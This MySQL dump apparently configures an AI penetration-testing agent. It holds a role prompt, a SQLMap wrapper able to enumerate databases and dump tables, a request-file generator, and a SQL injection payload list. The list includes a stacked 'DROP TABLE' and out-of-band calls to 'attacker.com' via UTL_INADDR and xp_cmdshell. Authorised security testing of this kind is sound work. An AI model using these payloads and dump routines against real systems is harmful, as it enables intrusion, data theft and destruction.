-- ============================================
-- Skills Database - MySQL Version
-- 生成时间: 2026-01-28
-- ============================================

-- 创建数据库（如果需要）
-- CREATE DATABASE IF NOT EXISTS skills_db CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
-- USE skills_db;

-- ============================================
-- 表结构
-- ============================================

-- 技能主表
DROP TABLE IF EXISTS `skill_metadata`;
DROP TABLE IF EXISTS `skill_resources`;
DROP TABLE IF EXISTS `skills`;

CREATE TABLE `skills` (
    `id` INT NOT NULL AUTO_INCREMENT,
    `name` VARCHAR(100) NOT NULL,
    `description` TEXT NOT NULL,
    `instructions` LONGTEXT NOT NULL,
    `always_load` TINYINT(1) DEFAULT 0,
    `enabled` TINYINT(1) DEFAULT 1,
    `version` VARCHAR(20) DEFAULT '1.0.0',
    `level` INT DEFAULT 1 COMMENT '技能级别: 1=一级技能(直接可见), 2=二级技能(子技能)',
    `parent_skill_id` INT DEFAULT NULL COMMENT '父技能ID，NULL表示是一级技能',
    `created_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    `updated_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    PRIMARY KEY (`id`),
    UNIQUE KEY `uk_skills_name` (`name`),
    INDEX `idx_skills_name` (`name`),
    INDEX `idx_skills_enabled` (`enabled`),
    INDEX `idx_skills_level` (`level`),
    INDEX `idx_skills_parent` (`parent_skill_id`),
    CONSTRAINT `fk_skills_parent` FOREIGN KEY (`parent_skill_id`) REFERENCES `skills`(`id`) ON DELETE SET NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- 技能资源表
CREATE TABLE `skill_resources` (
    `id` INT NOT NULL AUTO_INCREMENT,
    `skill_id` INT NOT NULL,
    `resource_name` VARCHAR(255) NOT NULL,
    `resource_type` VARCHAR(50) NOT NULL,
    `content` LONGTEXT,
    `file_path` VARCHAR(500),
    `description` TEXT,
    `created_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    `updated_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    PRIMARY KEY (`id`),
    UNIQUE KEY `uk_resource` (`skill_id`, `resource_name`),
    INDEX `idx_resources_skill_id` (`skill_id`),
    CONSTRAINT `fk_resources_skill` FOREIGN KEY (`skill_id`) REFERENCES `skills`(`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- 技能元数据表
CREATE TABLE `skill_metadata` (
    `id` INT NOT NULL AUTO_INCREMENT,
    `skill_id` INT NOT NULL,
    `meta_key` VARCHAR(100) NOT NULL,
    `meta_value` TEXT,
    PRIMARY KEY (`id`),
    UNIQUE KEY `uk_metadata` (`skill_id`, `meta_key`),
    CONSTRAINT `fk_metadata_skill` FOREIGN KEY (`skill_id`) REFERENCES `skills`(`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- ============================================
-- 数据插入
-- ============================================

-- 插入技能数据
INSERT INTO `skills` (`id`, `name`, `description`, `instructions`, `always_load`, `enabled`, `version`, `created_at`, `updated_at`) VALUES
(1, 'role_definition', 'AI agent\'s identity as a security testing specialist working with captured HTTP requests', '# Role Definition

## Identity

你是 Vulbox Wachi AI，一名精英级别的渗透测试和漏洞研究专家。

## Mission

你的主要任务是：

1. **接收用户提供的 HTTP 数据包**
2. **分析数据包的接口、参数、结构**
3. **根据数据包内容选择合适的 skill 进行测试**
4. **调用相应的工具和脚本**
5. **分析测试结果并报告**

## Core Principles

- 用户会提供捕获的 HTTP 请求数据包
- 根据接口特征判断可能存在的漏洞类型
- 选择对应的 skill（如 sqlmap_scanner）进行测试
- 使用 skill 中的 resources（脚本、payload）执行检测
- 分析结果并给出专业建议

## Context Awareness

每次对话可能包含：
- HTTP 请求数据包
- 响应数据包
- 用户的操作历史
- 已执行的测试结果

根据这些上下文信息，判断下一步应该采取的行动。', 1, 1, '1.0.0', '2026-01-27 07:37:00', '2026-01-27 07:37:00'),

(2, 'sqlmap_scanner', 'SQLMap integration for SQL injection testing based on captured HTTP requests', '# SQLMap Scanner Skill

## Overview

本技能用于基于用户提供的 HTTP 数据包进行 SQL 注入检测和利用。

## Workflow

当用户提供 HTTP 数据包时：

1. **分析数据包结构**
   - 提取 URL、方法、参数
   - 识别可能的注入点（GET/POST/Cookie/Header）
   - 确定请求格式

2. **生成请求文件**
   - 使用 `resources/request_generator.py` 将数据包转换为 SQLMap 格式
   - 保存为 `.txt` 文件供 SQLMap 使用

3. **调用 SQLMap**
   - 使用 `resources/sqlmap_wrapper.py` 封装的方法
   - 传入请求文件路径
   - 执行注入检测

4. **解析结果**
   - 分析 SQLMap 输出
   - 判断是否存在漏洞
   - 提取关键信息

## Tools Usage

### 方法 1: 从请求文件扫描

```python
from skills.sqlmap_scanner.resources.sqlmap_wrapper import SQLMapWrapper

wrapper = SQLMapWrapper()
result = wrapper.scan_from_request_file(\"request.txt\")
```

### 方法 2: 直接 URL 扫描

```python
wrapper = SQLMapWrapper()
result = wrapper.quick_scan(
    url=\"http://target.com/api/user?id=1\",
    data=None  # GET 请求
)
```

### 方法 3: POST 请求扫描

```python
wrapper = SQLMapWrapper()
result = wrapper.quick_scan(
    url=\"http://target.com/api/login\",
    data=\"username=admin&password=test\"
)
```

## Available Resources

### Scripts

- `resources/sqlmap_wrapper.py` - SQLMap 封装类
  - `quick_scan()` - 快速扫描
  - `deep_scan()` - 深度扫描
  - `enum_dbs()` - 枚举数据库
  - `dump_table()` - 提取表数据
  - `scan_from_request_file()` - 从请求文件扫描

- `resources/request_generator.py` - HTTP 请求文件生成器
  - 将数据包转换为 SQLMap 格式

### Payloads

- `resources/payloads/custom_payloads.txt` - SQL 注入 payload 集合

### Templates

- `resources/templates/request_template.txt` - HTTP 请求模板

## Response Format

扫描结果格式：

```json
{
  \"success\": true,
  \"vulnerable\": true/false,
  \"injection_points\": [...],
  \"databases\": [...],
  \"summary\": \"...\"
}
```

## Safety Guidelines

⚠️ **仅在授权范围内使用**
- 只测试明确授权的目标
- 遵守安全测试规范', 0, 1, '1.0.0', '2026-01-27 07:37:00', '2026-01-27 07:37:00');

-- 插入技能资源数据
INSERT INTO `skill_resources` (`id`, `skill_id`, `resource_name`, `resource_type`, `content`, `file_path`, `description`, `created_at`, `updated_at`) VALUES
(1, 2, 'request_generator.py', 'script', '#!/usr/bin/env python3
\"\"\"
HTTP 请求文件生成器
用于生成 SQLMap 可读的请求文件
\"\"\"

import argparse
from pathlib import Path


REQUEST_TEMPLATE = \"\"\"POST /login HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: {content_type}
Content-Length: {content_length}

{body}\"\"\"


def generate_request_file(
    url: str,
    method: str = \"GET\",
    headers: dict = None,
    body: str = \"\",
    output: str = \"request.txt\"
) -> str:
    \"\"\"
    生成 HTTP 请求文件
    
    Args:
        url: 目标 URL
        method: HTTP 方法
        headers: 请求头
        body: 请求体
        output: 输出文件名
        
    Returns:
        生成的文件路径
    \"\"\"
    # 解析 URL
    from urllib.parse import urlparse
    parsed = urlparse(url)
    
    host = parsed.netloc
    path = parsed.path or \"/\"
    if parsed.query:
        path += f\"?{parsed.query}\"
    
    # 默认请求头
    if headers is None:
        headers = {}
    
    default_headers = {
        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\",
        \"Accept\": \"*/*\",
        \"Connection\": \"close\"
    }
    default_headers.update(headers)
    
    # 构建请求
    lines = [f\"{method} {path} HTTP/1.1\"]
    lines.append(f\"Host: {host}\")
    
    for key, value in default_headers.items():
        lines.append(f\"{key}: {value}\")
    
    if body:
        lines.append(f\"Content-Length: {len(body)}\")
        lines.append(\"\")
        lines.append(body)
    
    request_content = \"\\n\".join(lines)
    
    # 写入文件
    output_path = Path(output)
    output_path.write_text(request_content, encoding=\'utf-8\')
    
    print(f\"✅ HTTP 请求文件已生成: {output_path}\")
    print(f\"\\n内容预览:\")
    print(\"=\"*60)
    print(request_content[:300])
    print(\"=\"*60)
    
    return str(output_path)


def main():
    \"\"\"命令行入口\"\"\"
    parser = argparse.ArgumentParser(description=\"生成 SQLMap 请求文件\")
    parser.add_argument(\"--url\", required=True, help=\"目标 URL\")
    parser.add_argument(\"--method\", default=\"GET\", help=\"HTTP 方法\")
    parser.add_argument(\"--body\", default=\"\", help=\"请求体\")
    parser.add_argument(\"--output\", default=\"request.txt\", help=\"输出文件名\")
    
    args = parser.parse_args()
    
    generate_request_file(
        url=args.url,
        method=args.method,
        body=args.body,
        output=args.output
    )
    
    print(f\"\\n使用方式:\")
    print(f\"  sqlmap -r {args.output} --batch\")


if __name__ == \"__main__\":
    main()', NULL, '从 request_generator.py 导入', '2026-01-27 07:37:00', '2026-01-27 07:37:00'),

(2, 2, 'sqlmap_wrapper.py', 'script', '#!/usr/bin/env python3
\"\"\"
SQLMap 封装脚本
简化 SQLMap 的调用和结果解析
\"\"\"

import subprocess
import json
import sys
import argparse
from pathlib import Path
from typing import Optional, Dict, List


class SQLMapWrapper:
    \"\"\"SQLMap 封装类\"\"\"
    
    def __init__(self, sqlmap_path: str = \"sqlmap\"):
        \"\"\"
        初始化
        
        Args:
            sqlmap_path: SQLMap 可执行文件路径（默认使用系统 PATH）
        \"\"\"
        self.sqlmap_path = sqlmap_path
        self.output_dir = Path(\"sqlmap_output\")
        self.output_dir.mkdir(exist_ok=True)
    
    def quick_scan(self, url: str, data: Optional[str] = None) -> Dict:
        \"\"\"
        快速扫描
        
        Args:
            url: 目标 URL
            data: POST 数据（可选）
            
        Returns:
            扫描结果字典
        \"\"\"
        print(f\"[SQLMap] 快速扫描: {url}\")
        
        cmd = [
            self.sqlmap_path,
            \"-u\", url,
            \"--batch\",
            \"--random-agent\",
            \"--level=1\",
            \"--risk=1\"
        ]
        
        if data:
            cmd.extend([\"--data\", data])
        
        result = self._run_sqlmap(cmd)
        return self._parse_result(result)
    
    def deep_scan(self, url: str, data: Optional[str] = None) -> Dict:
        \"\"\"
        深度扫描
        
        Args:
            url: 目标 URL
            data: POST 数据（可选）
            
        Returns:
            扫描结果字典
        \"\"\"
        print(f\"[SQLMap] 深度扫描: {url}\")
        
        cmd = [
            self.sqlmap_path,
            \"-u\", url,
            \"--batch\",
            \"--random-agent\",
            \"--level=5\",
            \"--risk=3\",
            f\"--output-dir={self.output_dir}\"
        ]
        
        if data:
            cmd.extend([\"--data\", data])
        
        result = self._run_sqlmap(cmd)
        return self._parse_result(result)
    
    def enum_dbs(self, url: str) -> Dict:
        \"\"\"
        枚举数据库
        
        Args:
            url: 已确认存在注入的 URL
            
        Returns:
            数据库列表
        \"\"\"
        print(f\"[SQLMap] 枚举数据库: {url}\")
        
        cmd = [
            self.sqlmap_path,
            \"-u\", url,
            \"--batch\",
            \"--dbs\"
        ]
        
        result = self._run_sqlmap(cmd)
        return self._parse_result(result)
    
    def dump_table(
        self, 
        url: str, 
        database: str, 
        table: str,
        columns: Optional[List[str]] = None
    ) -> Dict:
        \"\"\"
        提取表数据
        
        Args:
            url: 目标 URL
            database: 数据库名
            table: 表名
            columns: 指定列名（可选）
            
        Returns:
            提取的数据
        \"\"\"
        print(f\"[SQLMap] 提取数据: {database}.{table}\")
        
        cmd = [
            self.sqlmap_path,
            \"-u\", url,
            \"--batch\",
            \"-D\", database,
            \"-T\", table,
            \"--dump\"
        ]
        
        if columns:
            cmd.extend([\"-C\", \",\".join(columns)])
        
        result = self._run_sqlmap(cmd)
        return self._parse_result(result)
    
    def scan_from_request_file(self, request_file: str) -> Dict:
        \"\"\"
        从 HTTP 请求文件扫描
        
        Args:
            request_file: HTTP 请求文件路径
            
        Returns:
            扫描结果
        \"\"\"
        print(f\"[SQLMap] 从请求文件扫描: {request_file}\")
        
        cmd = [
            self.sqlmap_path,
            \"-r\", request_file,
            \"--batch\",
            \"--random-agent\"
        ]
        
        result = self._run_sqlmap(cmd)
        return self._parse_result(result)
    
    def _run_sqlmap(self, cmd: List[str]) -> subprocess.CompletedProcess:
        \"\"\"
        执行 SQLMap 命令
        
        Args:
            cmd: 命令列表
            
        Returns:
            执行结果
        \"\"\"
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300,  # 5分钟超时
                encoding=\'utf-8\',
                errors=\'ignore\'
            )
            return result
        except subprocess.TimeoutExpired:
            print(\"[SQLMap] 执行超时\")
            raise
        except Exception as e:
            print(f\"[SQLMap] 执行失败: {e}\")
            raise
    
    def _parse_result(self, result: subprocess.CompletedProcess) -> Dict:
        \"\"\"
        解析 SQLMap 输出
        
        Args:
            result: subprocess 结果
            
        Returns:
            解析后的结果字典
        \"\"\"
        output = result.stdout
        
        parsed = {
            \"success\": result.returncode == 0,
            \"output\": output,
            \"vulnerable\": False,
            \"injection_points\": [],
            \"databases\": [],
            \"summary\": \"\"
        }
        
        # 检测是否发现注入
        if \"is vulnerable\" in output.lower() or \"injectable\" in output.lower():
            parsed[\"vulnerable\"] = True
        
        # 提取注入点信息
        if \"Parameter:\" in output:
            # 简单提取（实际应该用更复杂的解析）
            lines = output.split(\'\\n\')
            for i, line in enumerate(lines):
                if \"Parameter:\" in line and i + 1 < len(lines):
                    parsed[\"injection_points\"].append(line.strip())
        
        # 提取数据库列表
        if \"available databases\" in output.lower():
            # 提取数据库名（简化版本）
            lines = output.split(\'\\n\')
            for line in lines:
                if line.strip().startswith(\'[*]\'):
                    db_name = line.strip()[4:].strip()
                    if db_name:
                        parsed[\"databases\"].append(db_name)
        
        # 生成摘要
        if parsed[\"vulnerable\"]:
            parsed[\"summary\"] = f\"发现 SQL 注入漏洞！注入点: {len(parsed[\'injection_points\'])}\"
        else:
            parsed[\"summary\"] = \"未发现 SQL 注入漏洞\"
        
        return parsed


def main():
    \"\"\"命令行入口\"\"\"
    parser = argparse.ArgumentParser(description=\"SQLMap 封装脚本\")
    parser.add_argument(\"--url\", required=True, help=\"目标 URL\")
    parser.add_argument(\"--data\", help=\"POST 数据\")
    parser.add_argument(\"--quick\", action=\"store_true\", help=\"快速扫描\")
    parser.add_argument(\"--deep\", action=\"store_true\", help=\"深度扫描\")
    parser.add_argument(\"--dbs\", action=\"store_true\", help=\"枚举数据库\")
    parser.add_argument(\"--request\", help=\"HTTP 请求文件\")
    
    args = parser.parse_args()
    
    wrapper = SQLMapWrapper()
    
    if args.request:
        result = wrapper.scan_from_request_file(args.request)
    elif args.dbs:
        result = wrapper.enum_dbs(args.url)
    elif args.deep:
        result = wrapper.deep_scan(args.url, args.data)
    else:
        result = wrapper.quick_scan(args.url, args.data)
    
    # 输出结果
    print(\"\\n\" + \"=\"*60)
    print(\"扫描结果:\")
    print(\"=\"*60)
    print(f\"状态: {\'✅ 成功\' if result[\'success\'] else \'❌ 失败\'}\")
    print(f\"摘要: {result[\'summary\']}\")
    
    if result[\'vulnerable\']:
        print(f\"\\n🔴 发现漏洞!\")
        if result[\'injection_points\']:
            print(f\"注入点: {len(result[\'injection_points\'])} 个\")
    
    if result[\'databases\']:
        print(f\"\\n数据库: {\', \'.join(result[\'databases\'])}\")
    
    print(\"\\n详细输出:\")
    print(result[\'output\'][:1000])
    
    # 保存 JSON 结果
    output_file = wrapper.output_dir / \"result.json\"
    with open(output_file, \'w\', encoding=\'utf-8\') as f:
        json.dump(result, f, ensure_ascii=False, indent=2)
    
    print(f\"\\n完整结果已保存到: {output_file}\")


if __name__ == \"__main__\":
    main()', NULL, '从 sqlmap_wrapper.py 导入', '2026-01-27 07:37:00', '2026-01-27 07:37:00'),

(3, 2, 'payloads\\custom_payloads.txt', 'payload', '# 自定义 SQL 注入 Payload

## MySQL Payloads
\' OR \'1\'=\'1
\' OR 1=1#
\' OR 1=1-- -
admin\' OR \'1\'=\'1
\' UNION SELECT NULL,NULL,NULL#
\' UNION SELECT @@version,user(),database()#

## MSSQL Payloads
\' OR \'1\'=\'1\'--
\'; WAITFOR DELAY \'00:00:05\'--
\' AND 1=CONVERT(int, (SELECT @@version))--
\' UNION SELECT NULL,NULL,NULL--

## PostgreSQL Payloads
\' OR \'1\'=\'1\'--
\'; SELECT pg_sleep(5)--
\' UNION SELECT NULL,NULL,NULL--
\' || pg_sleep(5)--

## Oracle Payloads
\' OR \'1\'=\'1
\' UNION SELECT NULL,NULL FROM dual--
\' AND 1=UTL_INADDR.get_host_address(\'attacker.com\')--

## 时间盲注
\' AND SLEEP(5)#
\'; WAITFOR DELAY \'00:00:05\'--
\' || pg_sleep(5)--
\' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--

## Boolean 盲注
\' AND 1=1#
\' AND 1=2#
\' AND ASCII(SUBSTRING((SELECT database()),1,1))>64#

## Stacked Queries
\'; DROP TABLE test--
\'; EXEC xp_cmdshell(\'ping attacker.com\')--

## 绕过 WAF
\' /*!50000OR*/ \'1\'=\'1
\' %2b %2b \'1\'=\'1
\' ||\'1\'=\'1
\' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))#', NULL, '从 payloads\\custom_payloads.txt 导入', '2026-01-27 07:37:00', '2026-01-27 07:37:00'),

(4, 2, 'templates\\request_template.txt', 'template', 'POST /api/login HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 35

username=admin&password=test123*', NULL, '从 templates\\request_template.txt 导入', '2026-01-27 07:37:00', '2026-01-27 07:37:00');

-- ============================================
-- 重置自增ID序列
-- ============================================
ALTER TABLE `skills` AUTO_INCREMENT = 3;
ALTER TABLE `skill_resources` AUTO_INCREMENT = 5;
ALTER TABLE `skill_metadata` AUTO_INCREMENT = 1;

